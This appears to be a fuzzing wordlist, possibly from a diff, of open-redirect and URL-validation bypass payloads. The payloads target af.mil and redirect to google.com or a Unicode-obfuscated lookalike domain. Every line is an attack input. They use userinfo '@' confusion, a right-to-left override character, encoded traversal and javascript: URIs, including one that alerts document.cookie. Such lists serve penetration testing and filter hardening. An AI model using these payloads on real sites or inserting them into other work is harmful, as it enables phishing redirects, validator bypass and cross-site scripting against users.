+af.mil@%E2%80%AE@google.com
+////af.mil@google.com//
+////af.mil@google.com/
+///af.mil@google.com//
+///af.mil@google.com/
+//af.mil@google.com//
+//af.mil@google.com/
+af.mil;@google.com
+af.mil.google.com
+////af.mil@google.com/%2e%2e
+///af.mil@google.com/%2e%2e
+////af.mil@google.com/%2e%2e%2f
+///af.mil@google.com/%2e%2e%2f
+//af.mil@google.com/%2e%2e%2f
+////af.mil@google.com/%2f..
+///af.mil@google.com/%2f..
+//af.mil@google.com/%2f..
+////af.mil@google.com/%2f%2e%2e
+///af.mil@google.com/%2f%2e%2e
+//af.mil@google.com/%2f%2e%2e
+//af.mil+&@google.com#+@af.mil/
+//af.mil@https:///Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/%2e%2e
+//af.mil@https:///google.com/%2e%2e
+//af.mil+&@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ#+@af.mil/
+/x:1/:///%01javascript:alert(document.cookie)/
+\x6A\x61\x76\x61\x73\x63\x72\x69\x70\x74\x3aalert(1)
+//XY>.7d8T\205pZM@af.mil@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//XY>.7d8T\205pZM@af.mil+@Ⓛ𝐨𝗰 𝕝ⅆ𝓸ⓜₐℹⓃ｡Ｐⓦ/
+//XY>.7d8T\205pZM@af.mil@google.com/
+//XY>.7d8T\205pZM@af.mil+@google.com/
